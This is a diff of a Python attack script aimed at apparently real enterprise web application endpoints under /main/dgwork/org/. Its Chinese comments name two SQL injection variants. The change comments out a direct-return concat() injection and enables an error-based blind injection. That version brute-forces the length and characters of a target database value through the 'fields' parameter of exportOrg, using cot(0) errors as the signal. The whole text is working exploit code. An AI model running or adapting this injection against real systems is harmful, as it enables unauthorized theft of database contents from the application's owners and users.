@@ -52,34 +52,34 @@ response = requests.post(f'{url}/main/dgwork/org/saveUser?sysappid={sysAppId}', 
 
 # sql injection 直接返回版
 
-data = {
-    'fields': f'concat("","",({target}),"") as "\\"\\""'
-}
+# data = {
+#     'fields': f'concat("","",({target}),"") as "\\"\\""'
+# }
 
-response = requests.post(f'{url}/main/dgwork/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)
+# response = requests.post(f'{url}/main/dgwork/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)
 
-with open('test.xlsx', 'wb') as f:
-    f.write(response.content)
+# with open('test.xlsx', 'wb') as f:
+#     f.write(response.content)
 
 # sql injection 报错注入版
 
-# for i in range(0,100):
-#     data = {
-#         'fields': f'if(length({target})={i},cot(0),1)'
-#     }
-#     response = requests.post(f'{url}/main/dgwork/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)
-#     if 'error' in response.text:
-#         length = i
-#         break
+for i in range(0,100):
+    data = {
+        'fields': f'if(length({target})={i},cot(0),1)'
+    }
+    response = requests.post(f'{url}/main/dgwork/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)
+    if 'error' in response.text:
+        length = i
+        break
 
-# res = ""
-# for i in range(length):
-#     for c in string.printable:
-#         data = {
-#             'fields': f'if(ord(substr({target},{i+1},1))={ord(c)},cot(0),1)'
-#         }
-#         response = requests.post(f'{url}/main/dgwork/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)
-#         if 'error' in response.text:
-#             res += c
-#             print(res)
-#             break
+res = ""
+for i in range(length):
+    for c in string.printable:
+        data = {
+            'fields': f'if(ord(substr({target},{i+1},1))={ord(c)},cot(0),1)'
+        }
+        response = requests.post(f'{url}/main/dgwork/org/exportOrg?syscorpid=123456&sysappid={sysAppId}', cookies=cookies, headers=headers, data=data)
+        if 'error' in response.text:
+            res += c
+            print(res)
+            break
